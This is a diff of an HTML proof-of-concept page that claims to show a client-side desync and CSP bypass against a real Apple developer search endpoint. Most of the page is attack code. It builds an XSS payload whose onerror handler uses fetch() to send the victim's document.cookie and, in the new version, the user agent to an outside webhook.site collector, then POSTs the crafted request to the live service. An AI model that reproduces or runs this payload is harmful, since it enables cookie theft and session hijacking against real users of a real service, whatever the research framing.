@@ -2,20 +2,20 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Apple Developer CSD PoC</title>
+  <title>Apple Developer Desync PoC</title>
 </head>
 <body>
   <h2>Apple Developer Client-Side Desync PoC</h2>
-  <p>This page demonstrates how a crafted request can lead to CSP bypass.</p>
+  <p>This page demonstrates a crafted request and CSP bypass attempt.</p>
 
   <script>
-    // Webhook 
+    // Webhook الخاص بك
     const webhook = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";
 
-    //  payload 
-    const payload = "<img src=x onerror=\"fetch('" + webhook + "?cookie='+document.cookie)\">";
+    // Payload بسيط مع onerror
+    const payload = "<img src=x onerror=\"fetch('" + webhook + "?cookie='+document.cookie+'&ua='+navigator.userAgent)\">";
 
-    // Post
+    // إرسال الطلب المصمم للـ endpoint
     fetch("https://developer.apple.com/search/services/v1/quick-links/", {
       method: "POST",
       headers: {"Content-Type": "application/x-www-form-urlencoded"},
@@ -24,7 +24,7 @@
     })
     .then(res => res.text())
     .then(text => {
-      console.log("Response received:", text.slice(0,200));
+      console.log("Response snippet:", text.slice(0,200));
       document.body.innerHTML += "<pre>Response snippet:\n" + text.slice(0,200) + "</pre>";
     })
     .catch(err => console.error("PoC Error:", err));
